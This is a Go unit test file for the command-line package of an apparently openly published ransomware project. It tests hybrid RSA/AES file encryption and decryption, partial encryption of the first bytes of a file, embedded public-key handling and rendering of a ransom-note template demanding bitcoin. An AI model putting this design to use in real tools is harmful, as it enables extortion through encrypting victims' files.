package cli

import (
	"bytes"
	"os"
	"slices"
	"testing"
	"time"

	"github.com/marmos91/ransomware/crypto"
	"github.com/marmos91/ransomware/ransom"
)

func TestSplitCommaSeparated(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  []string
	}{
		{"empty", "", nil},
		{"single", ".enc", []string{".enc"}},
		{"multiple", ".enc,.txt,.go", []string{".enc", ".txt", ".go"}},
		{"with spaces", " .enc , .txt , .go ", []string{".enc", ".txt", ".go"}},
		{"trailing comma", ".enc,.txt,", []string{".enc", ".txt"}},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got := splitCommaSeparated(tc.input)
			if !slices.Equal(got, tc.want) {
				t.Fatalf("got %v, want %v", got, tc.want)
			}
		})
	}
}

func TestResolvePublicKey(t *testing.T) {
	k := setupTestKeys(t)
	pubPEM, err := crypto.ExportRsaPublicKeyAsPemStr(k.Keypair.Public)
	if err != nil {
		t.Fatalf("export public key: %v", err)
	}

	dir := t.TempDir()
	pubPath := dir + "/pub.pem"
	if err := os.WriteFile(pubPath, []byte(pubPEM), 0644); err != nil {
		t.Fatalf("write pub.pem: %v", err)
	}

	t.Run("from file", func(t *testing.T) {
		got, err := resolvePublicKey(pubPath)
		if err != nil {
			t.Fatalf("resolvePublicKey: %v", err)
		}
		if got.N.Cmp(k.Keypair.Public.N) != 0 {
			t.Fatal("loaded public key does not match")
		}
	})

	t.Run("missing path and no embed", func(t *testing.T) {
		prev := EmbeddedPublicKeyPEM
		EmbeddedPublicKeyPEM = ""
		t.Cleanup(func() { EmbeddedPublicKeyPEM = prev })

		if _, err := resolvePublicKey(""); err == nil {
			t.Fatal("expected error when no path and no embedded key")
		}
	})

	t.Run("from embedded", func(t *testing.T) {
		prev := EmbeddedPublicKeyPEM
		EmbeddedPublicKeyPEM = pubPEM
		t.Cleanup(func() { EmbeddedPublicKeyPEM = prev })

		got, err := resolvePublicKey("")
		if err != nil {
			t.Fatalf("resolvePublicKey embedded: %v", err)
		}
		if got.N.Cmp(k.Keypair.Public.N) != 0 {
			t.Fatal("embedded public key does not match")
		}
	})

	t.Run("file overrides embedded", func(t *testing.T) {
		prev := EmbeddedPublicKeyPEM
		EmbeddedPublicKeyPEM = "not-a-pem"
		t.Cleanup(func() { EmbeddedPublicKeyPEM = prev })

		got, err := resolvePublicKey(pubPath)
		if err != nil {
			t.Fatalf("resolvePublicKey with path should ignore bad embed: %v", err)
		}
		if got.N.Cmp(k.Keypair.Public.N) != 0 {
			t.Fatal("loaded public key does not match")
		}
	})
}

func TestResolveRansomTemplate(t *testing.T) {
	const body = "pay {{.BitcoinCount}} to {{.BitcoinAddress}}"
	dir := t.TempDir()
	tmplPath := dir + "/note.txt"
	if err := os.WriteFile(tmplPath, []byte(body), 0644); err != nil {
		t.Fatalf("write template: %v", err)
	}

	t.Run("from file", func(t *testing.T) {
		tmpl, err := resolveRansomTemplate(tmplPath)
		if err != nil {
			t.Fatalf("resolveRansomTemplate: %v", err)
		}
		var buf bytes.Buffer
		if err := tmpl.Execute(&buf, &ransomData{BitcoinCount: 1.5, BitcoinAddress: "addr"}); err != nil {
			t.Fatalf("execute: %v", err)
		}
		if got := buf.String(); got != "pay 1.5 to addr" {
			t.Fatalf("got %q", got)
		}
	})

	t.Run("missing path and no embed", func(t *testing.T) {
		prev := ransom.EmbeddedTemplate
		ransom.EmbeddedTemplate = ""
		t.Cleanup(func() { ransom.EmbeddedTemplate = prev })

		if _, err := resolveRansomTemplate(""); err == nil {
			t.Fatal("expected error when no path and no embedded template")
		}
	})

	t.Run("from embedded", func(t *testing.T) {
		prev := ransom.EmbeddedTemplate
		ransom.EmbeddedTemplate = body
		t.Cleanup(func() { ransom.EmbeddedTemplate = prev })

		tmpl, err := resolveRansomTemplate("")
		if err != nil {
			t.Fatalf("resolveRansomTemplate embedded: %v", err)
		}
		var buf bytes.Buffer
		if err := tmpl.Execute(&buf, &ransomData{BitcoinCount: 2, BitcoinAddress: "bc1"}); err != nil {
			t.Fatalf("execute: %v", err)
		}
		if got := buf.String(); got != "pay 2 to bc1" {
			t.Fatalf("got %q", got)
		}
	})

	t.Run("file overrides embedded", func(t *testing.T) {
		prev := ransom.EmbeddedTemplate
		ransom.EmbeddedTemplate = "{{.Missing}}"
		t.Cleanup(func() { ransom.EmbeddedTemplate = prev })

		tmpl, err := resolveRansomTemplate(tmplPath)
		if err != nil {
			t.Fatalf("resolveRansomTemplate with path should ignore bad embed: %v", err)
		}
		var buf bytes.Buffer
		if err := tmpl.Execute(&buf, &ransomData{BitcoinCount: 1, BitcoinAddress: "x"}); err != nil {
			t.Fatalf("execute: %v", err)
		}
		if got := buf.String(); got != "pay 1 to x" {
			t.Fatalf("got %q", got)
		}
	})
}

func TestValidateEncSuffix(t *testing.T) {
	tests := []struct {
		name    string
		suffix  string
		wantErr bool
	}{
		{".enc is ok", ".enc", false},
		{"enc without dot", "enc", true},
		{"empty", "", true},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := validateEncSuffix(tc.suffix)
			if (err != nil) != tc.wantErr {
				t.Fatalf("validateEncSuffix(%q) error = %v, wantErr %v", tc.suffix, err, tc.wantErr)
			}
		})
	}
}

func TestFileHeader_WriteRead(t *testing.T) {
	hdr := fileHeader{
		KeySizeBits:  2048,
		FileMode:     0644,
		ModTime:      time.Now().Unix(),
		PartialBytes: 512,
	}

	var buf bytes.Buffer
	if err := hdr.writeTo(&buf); err != nil {
		t.Fatalf("write header: %v", err)
	}

	var got fileHeader
	if err := got.readFrom(&buf); err != nil {
		t.Fatalf("read header: %v", err)
	}

	if got != hdr {
		t.Fatalf("header mismatch: got %+v, want %+v", got, hdr)
	}
}

func TestEncryptDecryptFile(t *testing.T) {
	k := setupTestKeys(t)
	dir := t.TempDir()
	original := []byte("original file content")
	srcPath := createTestFile(t, dir, "test.txt", original)

	mtime := time.Date(2024, 1, 15, 12, 0, 0, 0, time.UTC)
	if err := os.Chtimes(srcPath, mtime, mtime); err != nil {
		t.Fatalf("set mtime: %v", err)
	}

	if err := encryptFile(srcPath, k.AesKey, k.EncryptedAesKey, k.KeySizeBits, 0, ".enc"); err != nil {
		t.Fatalf("encrypt: %v", err)
	}

	encPath := srcPath + ".enc"
	if _, err := os.Stat(encPath); err != nil {
		t.Fatalf("encrypted file should exist: %v", err)
	}

	if err := decryptFile(encPath, k.Keypair.Private, ".enc"); err != nil {
		t.Fatalf("decrypt: %v", err)
	}

	decrypted, err := os.ReadFile(srcPath)
	if err != nil {
		t.Fatalf("read decrypted: %v", err)
	}
	if !bytes.Equal(decrypted, original) {
		t.Fatal("decrypted content does not match original")
	}

	info, err := os.Stat(srcPath)
	if err != nil {
		t.Fatalf("stat decrypted: %v", err)
	}
	if info.ModTime().Unix() != mtime.Unix() {
		t.Fatalf("mtime not restored: got %v, want %v", info.ModTime(), mtime)
	}
}

func TestEncryptDecryptFile_Partial(t *testing.T) {
	k := setupTestKeys(t)
	dir := t.TempDir()

	original := make([]byte, 2048)
	for i := range original {
		original[i] = byte(i % 256)
	}
	srcPath := createTestFile(t, dir, "test.txt", original)

	if err := encryptFile(srcPath, k.AesKey, k.EncryptedAesKey, k.KeySizeBits, 512, ".enc"); err != nil {
		t.Fatalf("encrypt partial: %v", err)
	}

	encPath := srcPath + ".enc"
	if err := decryptFile(encPath, k.Keypair.Private, ".enc"); err != nil {
		t.Fatalf("decrypt partial: %v", err)
	}

	decrypted, err := os.ReadFile(srcPath)
	if err != nil {
		t.Fatalf("read decrypted: %v", err)
	}
	if !bytes.Equal(decrypted, original) {
		t.Fatalf("decrypted content does not match original (got %d bytes, want %d)", len(decrypted), len(original))
	}
}

func TestVerifyFile(t *testing.T) {
	k := setupTestKeys(t)
	dir := t.TempDir()
	srcPath := createTestFile(t, dir, "test.txt", []byte("content to verify"))

	if err := encryptFile(srcPath, k.AesKey, k.EncryptedAesKey, k.KeySizeBits, 0, ".enc"); err != nil {
		t.Fatalf("encrypt: %v", err)
	}

	encPath := srcPath + ".enc"
	if err := verifyFile(encPath, k.Keypair.Private); err != nil {
		t.Fatalf("verify should succeed: %v", err)
	}
}

func TestReadEncryptedHeader_WrongKey(t *testing.T) {
	kA := setupTestKeys(t)
	kB := setupTestKeys(t)

	dir := t.TempDir()
	srcPath := createTestFile(t, dir, "test.txt", []byte("secret"))

	if err := encryptFile(srcPath, kA.AesKey, kA.EncryptedAesKey, kA.KeySizeBits, 0, ".enc"); err != nil {
		t.Fatalf("encrypt: %v", err)
	}

	encPath := srcPath + ".enc"
	f, err := os.Open(encPath)
	if err != nil {
		t.Fatalf("open: %v", err)
	}
	defer f.Close()

	if _, _, err = readEncryptedHeader(f, kB.Keypair.Private); err == nil {
		t.Fatal("expected error when reading header with wrong key")
	}
}
